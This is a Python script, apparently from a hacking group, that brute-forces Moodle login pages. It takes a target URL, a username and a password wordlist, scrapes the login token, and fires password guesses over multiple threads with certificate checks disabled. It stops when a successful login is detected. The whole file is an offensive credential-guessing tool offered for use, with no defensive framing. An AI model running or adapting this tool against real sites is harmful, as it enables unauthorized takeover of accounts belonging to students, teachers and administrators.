import requests, threading, queue, time, os, re, urllib3
from colorama import Fore, Back, Style
from requests.exceptions import ConnectionError
from datetime import datetime
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Bruter():
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'
    inputQueue = queue.Queue()
    
    def __init__(self):
        print(r"""
        Admin Page Login Bruter
        { Mazterin-Dev } > Security Gh0st <
        """)
        self.webUrl     = input("Moodle Website (ex : https://cc.com/login/index.php) : ")
        self.wordlist   = input("WordList   : ")
        self.threads    = input("Threads ( Make ur CPU's Slowly ) : ")
        self.totalList  = len(list(open(self.wordlist, encoding='utf-8')))
        self.uname      = input("Moodle Uname : ")
        
    def get_info(self, words):
        try:
            ses = requests.Session()
            req = ses.get(self.webUrl,
                    headers={
                        'User-Agent': self.ua
                    },
                    verify=False
                )
            try:
                regex = re.search('name="logintoken" value="(.*?)"', req.text).group(1) 
                post_data['logintoken'] = str(regex)
            except:
                pass
            post_data = {
                'anchor': '',
                'username': str(self.uname),
                'password': str(words)
            }
            post = ses.post(self.webUrl,
                    headers={
                        'User-Agent': self.ua
                    },
                    data=post_data,
                    verify=False
                )
            if "You are logged in as" in post.text:
                return 'ok'
            else:
                print(post.text)
                return 'fail'
        except ConnectionError:
            return 'error'
        except:
            return 'error'
    
    def check(self):
        while 1:
            words = self.inputQueue.get()
            result = self.get_info(words)
            timez = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if result == 'ok':
                print("[+] {} Trying... {} {} {} [200 OK] {}".format(timez, Fore.GREEN, words, Fore.BLUE, Style.RESET_ALL))
                os._exit(1)
            elif result == 'fail':
                print("[+] {} Trying... {} {} {} [400 Fail] {}".format(timez, Fore.RED, words, Fore.YELLOW, Style.RESET_ALL))
            else:
                print("ERROR! Connection TimeOut to the website. website down ?")
                os._exit(1)
            self.inputQueue.task_done()
    
    def run_thread(self):
        for i in range(int(self.threads)):
            t = threading.Thread(target=self.check)
            t.setDaemon(True)
            t.start()
        for x in open(self.wordlist, 'r', encoding='utf-8').readlines():
            self.inputQueue.put(x.strip())
        self.inputQueue.join()

    def finish(self):
        print('')
        print('Checking', self.totalList, 'Wordlists has been completed perfectly')
        print('')
    
uo = Bruter()
uo.run_thread()
uo.finish()
